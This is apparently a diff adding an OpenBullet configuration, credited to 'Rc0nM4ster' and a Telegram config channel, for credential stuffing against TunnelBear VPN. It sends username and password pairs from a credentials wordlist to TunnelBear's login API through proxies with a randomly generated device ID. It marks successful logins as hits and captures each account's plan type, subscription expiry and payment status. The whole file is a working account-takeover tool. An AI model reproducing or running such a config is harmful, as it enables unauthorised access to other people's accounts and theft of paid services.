@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "TunnelBear VPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2025-01-28T10:43:26.6466328-05:00",
+  "AdditionalInfo": "Telegram Channel: T.me/OpenBullet_CFGs",
+  "RequiredPlugins": [],
+  "Author": "Rc0nM4ster",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function guid() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var uuid = guid();
+END SCRIPT -> VARS "uuid"
+
+#Login REQUEST POST "https://www.tunnelbear.com/core/api/login" AutoRedirect=FALSE EncodeContent=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=a1.0.0.169/samsung/SM-G988N/9&deviceId=<uuid>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Host: api.tunnelbear.com" 
+  HEADER "openvpn-version: jan_2015" 
+  HEADER "Referer: https://www.tunnelbear.com" 
+  HEADER "TB-CSRF-Token: " 
+  HEADER "User-Agent: " 
+  HEADER "Version: a1.0.0.169/samsung/SM-G988N/9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "fullVersion\":\"0" 
+
+#BearType PARSE "<SOURCE>" JSON "bearType" -> CAP "Bear Type" 
+
+#FullVersionUntil PARSE "<SOURCE>" JSON "fullVersionUntil" -> CAP "Full Version Until" 
+
+#ActiveGOTB PARSE "<SOURCE>" JSON "activeGOTB" -> CAP "Active GOTB" 
+
+#PaymentStatus PARSE "<SOURCE>" JSON "paymentStatus" -> CAP "Payment Status" 
+
